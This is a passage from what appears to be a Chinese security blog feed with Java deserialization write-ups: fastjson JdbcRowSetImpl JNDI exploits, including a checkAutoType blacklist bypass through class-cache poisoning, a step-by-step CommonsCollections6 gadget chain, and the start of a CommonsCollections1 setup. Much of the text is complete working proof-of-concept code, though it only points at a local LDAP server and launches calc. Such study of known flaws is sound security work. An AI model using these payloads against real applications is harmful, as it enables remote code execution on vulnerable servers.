Bean的写法</p><p>到这里，我们是可以构造这样的POC</p><p><code>ldap://127.0.0.1:8085/VigsjhwY</code>,弹计算器的恶意类</p><pre><code class="java">String s = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/VigsjhwY\&quot;&#125;&quot;;JSON.parseObject(s);</code></pre><p>但是这运行没法达到我们想要的结果</p><p>遇事不决，查找用法</p><p>这里查找connect()的用法，在<code>JdbcRowSetImpl</code>类中<code>setAutoCommit()</code>，找到了<code>connect()</code>，</p><pre><code class="java">public void setAutoCommit(boolean var1) throws SQLException &#123;    if (this.conn != null) &#123;        this.conn.setAutoCommit(var1);    &#125; else &#123;        this.conn = this.connect();        this.conn.setAutoCommit(var1);    &#125;&#125;public boolean getAutoCommit() throws SQLException &#123;    return this.conn.getAutoCommit();&#125;</code></pre><p>为了能够进入这个方法，还需要加上<code>AutoCommit</code>,解析的时候才会调用setter</p><p>因为它的参数是<code>boolean</code>类型的，传入个true或false,也可以传入0或1</p><p>最终POC</p><pre><code class="java">public class demo1 &#123;    public static void main(String[] args) &#123;        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/VigsjhwY\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;        JSON.parseObject(s);        //JSON.parse(s)//使用这个也行    &#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304092011433.png" alt="image-20230409200759348"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304092011828.png" alt="image-20230409200831610"></p><h2 id="fastjson1-2-25-lt-x3D-1-2-47绕过"><a href="#fastjson1-2-25-lt-x3D-1-2-47绕过" class="headerlink" title="fastjson1.2.25&lt;&#x3D;1.2.47绕过"></a>fastjson1.2.25&lt;&#x3D;1.2.47绕过</h2><p>刚刚复现的版本是1.2.24的fastjson,在这个版本之前，fastjson没有做类加载的限制，导致任意代码执行的问题</p><p>在1.2.24之后对漏洞进行了修复</p><p>下面用的是1.2.25版本进行演示</p><pre><code class="xml">&lt;dependency&gt;  &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  &lt;version&gt;1.2.25&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>再运行上次的payload直接报错</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101836889.png" alt="image-20230410140121948"></p><p>经过调试发现，在DefaultJSONParser.java中，loadClass变成了<code>checkAutoType</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101836261.png" alt="image-20230410141141798"></p><p>和之前的对比：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304092009321.png" alt="image-20230408222122119"></p><p>应该是这里出了问题，跟进去看看</p><p>发现之前的<code>TypeUtils.loadClass()</code>被丢到了判断里面了，并且按照之前的poc无法进入到判断里面</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101836949.png" alt="image-20230410142236791"></p><p>进入判断后还有两个循环，一个白名单<code>acceptList</code>,这个默认是空的，另一个是黑名单，<code>denyList</code>，这个是有内容的，内容如下：</p><pre><code class="java">denyList        = &quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;.split(&quot;,&quot;);</code></pre><p>可以看到<code>com.sun</code>在黑名单里面</p><p>这里的<code>TypeUtils.loadClass()</code>是用不了了，因为加载的类不在白名单里，换下一个</p><p>调试往下</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101836822.png" alt="image-20230410155047075"></p><p><code>getClassFromMapping(typeName)</code>是查找缓存，就是加载过的类会放到Mapping里，就是缓存，到第二次加载的时候就不重新加载了，直接在缓存里找</p><p>如果loadClass的时候就把恶意类放到缓存里了，是不是就可以绕过check了</p><p>跟进去看看</p><pre><code class="java">public static Class&lt;?&gt; getClassFromMapping(String className) &#123;    return mappings.get(className);&#125;</code></pre><p>这里直接从mappings里面获取数据</p><p>现在的问题是如何在mappings里面存东西</p><p>ALT+F7,查找用法，在loadClass(String,ClassLoader)里找到可以控制参数的<code>mappings.put</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101835506.png" alt="image-20230410161554305"></p><p>看看loadClass()</p><pre><code class="java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader)&#123;.....&#125;</code></pre><p>继续查找<code>loadClass</code>方法的调用</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101835230.png" alt="image-20230410173820101"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101835994.png" alt="image-20230410174149665"></p><p>有限制条件，只有满足<code>clazz == Class.class</code>才能进入,其中clazz是传进来的参数</p><pre><code class="java">public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName)&#123;&#125;</code></pre><p>看一下所在的类</p><pre><code class="java">public class MiscCodec implements ObjectSerializer, ObjectDeserializer&#123;&#125;</code></pre><p>在这可以知道<code>MiscCodec</code>实现了两个接口，是一个序列化和反序列化器</p><p>经过调试过程中发现，反序列化是在这里获取的</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101835023.png" alt="image-20230410175101694"></p><p>通过config找到对应的反序列化器，当类为<code>Class.class</code>的时候就会调用<code>MiscCodec</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101835579.png" alt="image-20230410175526180"></p><p>回到这里</p><pre><code class="java">if (clazz == Class.class) &#123;    return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());&#125;</code></pre><p><code>strVal</code>是传进来的字符串，当loadClass执行后，会把类名加载，然后放到缓存里</p><p>整个流程中，最主要的漏洞在于，当查找缓存的时候，查找到了就会返回这个类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101835253.png" alt="image-20230410181347378"></p><p>第一步先让它进行正常的加载，把恶意类放到缓存里</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;</code></pre><p>第二不就是加载恶意类，通过从缓存里查找来绕过类型检查java</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:8085/XzfLalyY&quot;,&quot;autoCommit&quot;:true&#125;</code></pre><p>最后的POC</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;public class demo1 &#123;    public static void main(String[] args) &#123;        String s = &quot;&#123;&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8085/XzfLalyY\",\"autoCommit\":true&#125;&#125;&quot;;        JSON.parse(s);    &#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101835796.png" alt="image-20230410182733010"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections6</title>
      <link href="/2023/04/06/CommonsCollections6/"/>
      <url>/2023/04/06/CommonsCollections6/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天搞的CC1没成功弹出计算器，后来查找发现，是jdk版本问题，8u71之后已修复不可利用，主要原因是 <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> 的逻辑变化了</p><p>CommonsCollections6 解决了高版本 Jdk 的利用问题，所以来学习一下（主要是懒得安装其低版本的jdk）</p><h2 id="利用链的限制条件："><a href="#利用链的限制条件：" class="headerlink" title="利用链的限制条件："></a>利用链的限制条件：</h2><p> JDK 版本：暂无限制、 CommonsCollections 3.1 - 3.2.1</p><h2 id="利用链："><a href="#利用链：" class="headerlink" title="利用链："></a>利用链：</h2><pre><code>    Gadget chain:        java.io.ObjectInputStream.readObject()            java.util.HashSet.readObject()                java.util.HashMap.put()                java.util.HashMap.hash()                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()                        org.apache.commons.collections.map.LazyMap.get()                            org.apache.commons.collections.functors.ChainedTransformer.transform()                            org.apache.commons.collections.functors.InvokerTransformer.transform()                            java.lang.reflect.Method.invoke()                                java.lang.Runtime.exec()</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>老方法，看着利用链来往上分析，虽然有部分是和CC1是一样的，但是还是想分析巩固一下</p><ul><li>第一层 <code>java.lang.Runtime.exec()</code></li></ul><pre><code class="java">Runtime.getRuntime().exec(&quot;calc&quot;);</code></pre><ul><li>第二层<code>java.lang.reflect.Method.invoke()</code></li></ul><p>这个就是反射调用</p><pre><code class="java">Runtime r = Runtime.getRuntime();Class c =Runtime.class;Method execMethod  = c.getMethod(&quot;exec&quot;,String.class);execMethod.invoke(r,&quot;calc&quot;);</code></pre><p>因为Runtime⽆法序列化，<code>Runtime.class</code>是可以序列化的,所以改成这样</p><pre><code class="java">Class c =Runtime.class;Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);Runtime r = (Runtime) getRuntime.invoke(null, null);Method exec = c.getMethod(&quot;exec&quot;, String.class);exec.invoke(r,&quot;calc&quot;);</code></pre><ul><li>第三层<code>org.apache.commons.collections.functors.InvokerTransformer.transform()</code></li></ul><p>这里查看一下<code>InvokerTransformer</code>这个类的<code>transform()</code>方法</p><pre><code class="java">public Object transform(Object input) &#123;        if (input == null) &#123;            return null;        &#125;        try &#123;            Class cls = input.getClass();            Method method = cls.getMethod(iMethodName, iParamTypes);            return method.invoke(input, iArgs);                        &#125; catch (NoSuchMethodException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);        &#125; catch (IllegalAccessException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);        &#125; catch (InvocationTargetException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, ex);        &#125;    &#125;</code></pre><p>这个方法，传入一个对象，在正常的情况下，通过反射，执行对象的方法，对比一下第二层就知道了，这里有点后门意思</p><p>查看<code>InvokerTransformer</code>的构造方法，发现<code>iMethodName</code>,<code>iParamTypes</code>,<code>iArgs</code>这几个参数可控</p><pre><code class="java">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;        super();        iMethodName = methodName;        iParamTypes = paramTypes;        iArgs = args;    &#125;</code></pre><p>那么我们就可以这么构造，执行命令</p><pre><code class="java">//Class c =Runtime.class;//Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);//Runtime r = (Runtime) getRuntime.invoke(null, null);Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);//Method exec = c.getMethod(&quot;exec&quot;, String.class).invoke(r,&quot;calc&quot;);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</code></pre><ul><li>第四层<code>org.apache.commons.collections.functors.ChainedTransformer.transform()</code></li></ul><p>这一层相当于把上面一层的代码优化一下，可以发现上面执行命令的过程中，前一步的输出是后一步的输入</p><p>查看<code>ChainedTransformer.transform()</code></p><pre><code class="java">    public Object transform(Object object) &#123;        for (int i = 0; i &lt; iTransformers.length; i++) &#123;            object = iTransformers[i].transform(object);        &#125;        return object;    &#125;</code></pre><p>这里就是实现了递归调用，把前一步的输出，当成后一步的输入</p><p>查看<code>ChainedTransformer</code>的构造函数</p><pre><code class="java">public ChainedTransformer(Transformer[] transformers) &#123;        super();        iTransformers = transformers;    &#125;</code></pre><p>这里只要传进一个<code>transformers</code>数组,然后递归调用</p><p>构造代码如下</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class);</code></pre><ul><li>第五层<code>org.apache.commons.collections.map.LazyMap.get()</code></li></ul><p>查看<code>LazyMap</code>类,<code>LazyMap</code>是只要执行 get 方法就会调用<strong>transform</strong>，</p><pre><code class="java">public Object get(Object key) &#123;        // create value for key if key is not currently in the map        if (map.containsKey(key) == false) &#123;            Object value = factory.transform(key);            map.put(key, value);            return value;        &#125;        return map.get(key);    &#125;</code></pre><p>这里可以看出，如果<code>factory</code>改为上层代码的<code>chainedTransformer</code>就可以执行命令了</p><p>但是这里有个if判断，大概的意思是，如果map里面有<code>key</code>,直接返回，如果没有则进入判断，把value补上</p><p>其中的<code>this.factory</code>对象，可以通过调用decorate(Map map, Transformer factory)方法，进而调用LazyMap(Map map, Factory factory)构造方法进行控制</p><pre><code class="java">public static Map decorate(Map map, Transformer factory) &#123;        return new LazyMap(map, factory);    &#125;</code></pre><pre><code class="java">protected LazyMap(Map map, Factory factory) &#123;        super(map);        if (factory == null) &#123;            throw new IllegalArgumentException(&quot;Factory must not be null&quot;);        &#125;        this.factory = FactoryTransformer.getInstance(factory);    &#125;</code></pre><p>所以构造代码如下：</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap innermap = new HashMap();LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);map.get(Runtime.class);</code></pre><ul><li>第六层<code>org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</code></li></ul><p>查看<code>TiedMapEntry</code>类，里面只有<code>getValue()</code>调用了<code>get()</code></p><pre><code class="java">public Object getValue() &#123;    return map.get(key);&#125;</code></pre><p>查看构造方法</p><pre><code class="java">public TiedMapEntry(Map map, Object key) &#123;    super();    this.map = map;    this.key = key;&#125;</code></pre><p>发现<code>map</code>和<code>key</code>都是可以控制的</p><p>所以构造方法如下：</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;      new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),      new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),      new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap innermap = new HashMap();LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);//只加了这两行TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);tiedmap.getValue();</code></pre><ul><li>第七层<code>org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</code></li></ul><p>刚刚是使用了<code>TiedMapEntry.getValue()</code>, 在<code>TiedMapEntry</code>类中，有几个方法用到了<code>getValue()</code></p><p>其中就有<code>hashCode()</code> ————–(为啥要用这个？到后面就知道了)</p><pre><code class="java">public int hashCode() &#123;        Object value = getValue();        return (getKey() == null ? 0 : getKey().hashCode()) ^               (value == null ? 0 : value.hashCode());     &#125;</code></pre><p>首先通过getValue()方法获取对象的值并赋给value变量，然后使用异或操作符 ^ 计算对象的哈希码。该方法的计算方式是将键（Key）的哈希码和值（Value）的哈希码异或在一起。</p><p>所以把上面的<code>tiedmap.getValue();</code>改为<code>tiedmap.hashCode();</code>就行了</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;  new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),  new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),  new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap innermap = new HashMap();LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);//就改了这里tiedmap.hashCode();</code></pre><ul><li>第八层<code>java.util.HashMap.hash()</code></li></ul><p>查看<code>HashMap.hash()</code> </p><pre><code class="java">static final int hash(Object key) &#123;    int h;    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125;</code></pre><p>该方法会判断传入的key是否为null，如果为null则直接返回0。如果key不为null，则通过key.hashCode()方法获取该Key的哈希码，并将结果存储在变量h中。然后将h和右移16位后的h按位异或运算( ^ )，得到最终的哈希码值并返回。</p><p> 我们不需要它的返回结果，只要他执行hashCode()就行</p><p>因为hash方法是HashMap类中的私有静态方法，无法从外部程序包中对其进行访问，可以用反射来调用它</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap innermap = new HashMap();LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);        //反射调用Class&lt;?&gt; hashMapClass = HashMap.class;Method hashMethod = hashMapClass.getDeclaredMethod(&quot;hash&quot;, Object.class);hashMethod.setAccessible(true);//设置访问权限hashMethod.invoke(null, tiedmap);</code></pre><ul><li>第九层<code>java.util.HashMap.put()</code></li></ul><p><code>put()</code>方法的代码如下</p><pre><code class="java">public V put(K key, V value) &#123;    return putVal(hash(key), key, value, false, true);&#125;</code></pre><p>这里只要我们只要put(tiedmap,”23131”)就可以触发hash(key)了，既hash(tiedmap)</p><p>所以到这一层的代码构造如下：</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;     new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),     new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),     new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap innermap = new HashMap();LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);HashMap&lt;Object,Object&gt; hashMap=new HashMap&lt;&gt;();hashMap.put(tiedmap,&quot;12333&quot;);</code></pre><ul><li>第十层<code>java.util.HashSet.readObject()</code></li></ul><p>很明显，这里已经是链子的末尾了，HashSet重写了<code>readObject()</code>,既反序列化入口</p><p>先来看一下这个<code>readObject()</code>的代码</p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)    throws java.io.IOException, ClassNotFoundException &#123;    // Consume and ignore stream fields (currently zero).    s.readFields();    // Read capacity and verify non-negative.    int capacity = s.readInt();    if (capacity &lt; 0) &#123;        throw new InvalidObjectException(&quot;Illegal capacity: &quot; +                                         capacity);    &#125;    // Read load factor and verify positive and non NaN.    float loadFactor = s.readFloat();    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) &#123;        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +                                         loadFactor);    &#125;    // Clamp load factor to range of 0.25...4.0.    loadFactor = Math.min(Math.max(0.25f, loadFactor), 4.0f);    // Read size and verify non-negative.    int size = s.readInt();    if (size &lt; 0) &#123;        throw new InvalidObjectException(&quot;Illegal size: &quot; + size);    &#125;    // Set the capacity according to the size and load factor ensuring that    // the HashMap is at least 25% full but clamping to maximum capacity.    capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f),            HashMap.MAXIMUM_CAPACITY);    // Constructing the backing map will lazily create an array when the first element is    // added, so check it before construction. Call HashMap.tableSizeFor to compute the    // actual allocation size. Check Map.Entry[].class since it&#39;s the nearest public type to    // what is actually created.    SharedSecrets.getJavaOISAccess()                 .checkArray(s, Map.Entry[].class, HashMap.tableSizeFor(capacity));    // Create backing HashMap    map = (((HashSet&lt;?&gt;)this) instanceof LinkedHashSet ?           new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :           new HashMap&lt;E,Object&gt;(capacity, loadFactor));    // Read in all elements in the proper order.    for (int i=0; i&lt;size; i++) &#123;        @SuppressWarnings(&quot;unchecked&quot;)            E e = (E) s.readObject();        map.put(e, PRESENT);    &#125;</code></pre><p>重点在这里，<code>s</code>是可控的，但是要如何确保<code>e</code>为我们想要的<code>tiedmap</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304062210181.png" alt="image-20230406205619715"></p><p>这里的 map 实际上就是 HashMap </p><pre><code class="java">private transient HashMap&lt;E,Object&gt; map;</code></pre><p>那么当执行到了<code>E e = (E) s.readObject();</code>，这段代码中先反序列化TiedMapEntry对象tiedmap，TiedMapEntry的对象如下内容</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304071244516.png" alt="image-20230407124422576"></p><p>这里可以看到map和key是可控的，但是这个map和key已经被我们构造好的payload进行了填充，</p><p>看一下 <code>HashSet</code> 中的序列化过程（writeObject）是否可控</p><p><code>HashSet.writeObject()</code>的代码如下</p><pre><code class="java">private void writeObject(java.io.ObjectOutputStream s)    throws java.io.IOException &#123;    // Write out any hidden serialization magic    s.defaultWriteObject();    // Write out HashMap capacity and load factor    s.writeInt(map.capacity());    s.writeFloat(map.loadFactor());    // Write out size    s.writeInt(map.size());    // Write out all elements in the proper order.    for (E e : map.keySet())        s.writeObject(e);&#125;</code></pre><p>传入的key是来自E e，这在writeObject中写明了来自其map成员</p><p>而 <strong>map</strong> ，我们可以在 HashSet 中看到并没有一个直接的方法可以直接赋值修改的，这就又要用到反射了</p><pre><code class="java">// 指定初始容量为1HashSet hashSet = new HashSet(1);hashSet.add(&quot;T0dis&quot;);// 反射获取HashSet中map的值Field HashSet_map =  Class.forName(&quot;java.util.HashSet&quot;).getDeclaredField(&quot;map&quot;);// 取消访问限制检查HashSet_map.setAccessible(true);// 获取HashSet中map的值HashMap hashSetMap = (HashMap) HashSet_map.get(hashSet);</code></pre><p>然后修改 hashSetMap 中的 key 值为 hashset</p><pre><code class="java">// 反射获取 HashMap 中 table 的值Field table =  Class.forName(&quot;java.util.HashMap&quot;).getDeclaredField(&quot;table&quot;);// 取消访问限制检查table.setAccessible(true);// 获取 HashMap 中 table 的值Object[] hashMapTable = (Object[]) table.get(hashSetMap);Object node = hashMapTable[0];if(node == null) &#123;      node = hashMapTable[1];&#125;// 将key 设为 tiedmapField key =  node.getClass().getDeclaredField(&quot;key&quot;);key.setAccessible(true);key.set(node, tiedmap);</code></pre><p>在这里利用反射获取了 hashSetMap 中的 table 属性，table 其实就是 hashmap 的存储底层，将 &lt;Key,Value&gt; 封装在了 Node 对象中，在获取到了 table 中的 key 之后，利用反射修改其为 tiedmap</p><ul><li>第十一层<code>java.io.ObjectInputStream.readObject()</code></li></ul><p>这个就是序列化的过程了</p><p>序列化和反序列化的代码如下</p><pre><code class="java">public static void serialize(Object obj) throws IOException&#123;    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));    oos.writeObject(obj);&#125;public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));    Object obj = ois.readObject();    return obj;&#125;</code></pre><h2 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h2><pre><code class="java">package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.keyvalue.TiedMapEntry;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;public class CC6 &#123;    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException, IOException &#123;        Transformer[] transformers = new Transformer[]&#123;                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap innermap = new HashMap();        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);        TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);        HashSet hashSet = new HashSet(1);        hashSet.add(&quot;T0dis&quot;);        Field HashSet_map =  Class.forName(&quot;java.util.HashSet&quot;).getDeclaredField(&quot;map&quot;);        HashSet_map.setAccessible(true);        HashMap hashSetMap = (HashMap) HashSet_map.get(hashSet);        Field table =  Class.forName(&quot;java.util.HashMap&quot;).getDeclaredField(&quot;table&quot;);        table.setAccessible(true);        Object[] hashMapTable = (Object[]) table.get(hashSetMap);        Object node = hashMapTable[0];        if(node == null) &#123;            node = hashMapTable[1];        &#125;        Field key =  node.getClass().getDeclaredField(&quot;key&quot;);        key.setAccessible(true);        key.set(node, tiedmap);        serialize(hashSet);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException&#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonCollections1</title>
      <link href="/2023/04/04/CommonCollections1/"/>
      <url>/2023/04/04/CommonCollections1/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonCollections1"><a href="#CommonCollections1" class="headerlink" title="CommonCollections1"></a>CommonCollections1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Commons Collections是反序列化漏洞学习过程中不可缺少的一部分，Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。</p><p>Apache Commons Collections 中提供了一个 Transformer 的类，这个接口的功能就是将一个对象转换为另外一个对象，CC 链都依赖于此</p><p>下面的是跟着大佬的脚步，一步一步分析，从零开始一层一层往上找链子</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>然后下载sun包，点击zip</p><p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p><p>下载后解压，把 jdk-af660750b2f4&#x2F;src&#x2F;share&#x2F;classes&#x2F;sun 放到jdk中src⽂件夹中，默认有个src.zip 需要先</p><p>解压</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051554777.png" alt="image-20230405101946093"></p><p>把src⽂件加载进来</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051554932.png" alt="image-20230405102033235"></p><p>创建一个Maven项目，不用选择任何Maven模板；<br>在pom.xml中添加如下代码：</p><pre><code class="xml">&lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;commons-collections&lt;/groupId&gt;            